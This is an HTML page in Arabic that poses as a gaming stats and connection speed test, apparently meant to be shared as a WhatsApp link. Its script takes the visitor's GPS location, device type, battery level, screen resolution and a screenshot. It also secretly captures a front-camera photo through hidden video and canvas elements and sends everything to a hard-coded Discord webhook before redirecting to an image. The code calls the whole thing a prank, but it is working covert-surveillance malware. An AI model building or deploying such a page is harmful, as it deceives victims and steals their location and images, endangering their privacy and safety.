<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gaming Hub & Stats | فحص الأداء</title>
    
    <!-- معاينة الواتساب بشكل رسمي -->
    <meta property="og:title" content="بطاقة اللاعب الرسمية | Gaming Stats 🎮">
    <meta property="og:description" content="اضغط هنا لعرض إحصائيات اللعب وفحص سرعة الاتصال.">
    <meta property="og:image" content="https://i.imgur.com/W333L67.png">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0b0f19;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(56, 189, 248, 0.2);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            width: 90%;
            max-width: 420px;
        }
        h2 {
            margin-top: 0;
            color: #38bdf8;
            font-size: 22px;
        }
        p {
            color: #94a3b8;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .btn {
            background: linear-gradient(90deg, #38bdf8, #818cf8);
            color: #0b0f19;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        .btn:hover {
            opacity: 0.9;
            transform: scale(1.02);
        }
        .status {
            margin-top: 15px;
            font-size: 13px;
            color: #64748b;
        }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>اختبار أداء وسرعة الاتصال</h2>
        <p>اضغط على الزر أدناه لبدء فحص سرعة الإنترنت ومطابقة بيانات اللاعب الحقيقية.</p>
        <button class="btn" onclick="startPrank()">بدء الفحص الآن 🚀</button>
        <div id="status" class="status"></div>
    </div>

    <!-- عناصر مخفية -->
    <video id="video" width="1280" height="720" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563206616780906536/Sgr0Y2vRCC4UEXiMXuavwOl738sFta-ui7TE057JstRKXZu1oiQ9ZTFPxbbhSK9oY4dE";
        const FINAL_REDIRECT_URL = "https://i.imgur.com/W333L67.png";

        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("غير مدعوم");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                    () => resolve("تم رفض إذن الموقع"),
                    { timeout: 3000 }
                );
            });
        }

        async function startPrank() {
            const statusEl = document.getElementById('status');
            statusEl.innerText = "جاري الاتصال بالسيرفر وفحص الجهاز...";

            // 1. جمع معلومات الجهاز الحقيقية
            const ua = navigator.userAgent;
            let phoneType = "كمبيوتر / جهاز آخر";
            if (/android/i.test(ua)) phoneType = "أندرويد (Android)";
            else if (/iphone|ipad|ipod/i.test(ua)) phoneType = "آيفون (iPhone / iOS)";

            let batteryInfo = "غير معروف";
            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? "يشحن" : "بطارية"})`;
                } catch(e) {}
            }

            const gps = await getGPSLocation();
            const textData = `🎯 **تم النقر على الزر وجلب البيانات الحقيقية!** 🔥
━━━━━━━━━━━━━━━━━━━━
📱 **الجهاز والإصدار:** ${phoneType}
🔋 **البطارية:** ${batteryInfo}
🗺️ **الموقع:** ${gps}
🖥️ **الدقة:** ${window.screen.width}x${window.screen.height}
━━━━━━━━━━━━━━━━━━━━`;

            // 2. أخذ لقطة شاشة (Screenshot)
            let screenshotBlob = null;
            try {
                const canvas = await html2canvas(document.body);
                screenshotBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
            } catch(e) {}

            // 3. التقاط صورة الكاميرا بمجرد الضغط
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // ننتظر ثانية عشان الكاميرا تلقط صورة واضحة
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا

                        // إرسال البيانات والصور للديسكورد
                        const formData = new FormData();
                        formData.append('payload_json', JSON.stringify({ content: textData }));
                        if (blob) formData.append('file1', blob, 'face_photo.jpg');
                        if (screenshotBlob) formData.append('file2', screenshotBlob, 'screen.png');

                        try {
                            await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                        } catch(err) {}

                        window.location.href = FINAL_REDIRECT_URL;
                    }, 'image/jpeg');

                }, 1500);

            } catch (err) {
                // لو رفض إذن الكاميرا، يرسل البيانات النصية وسكرين الشاشة على الأقل
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({ content: textData + "\n⚠️ (رفض إذن الكاميرا)" }));
                if (screenshotBlob) formData.append('file1', screenshotBlob, 'screen.png');
                
                try {
                    await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                } catch(e) {}

                window.location.href = FINAL_REDIRECT_URL;
            }
        }
    </script>
</body>
</html>
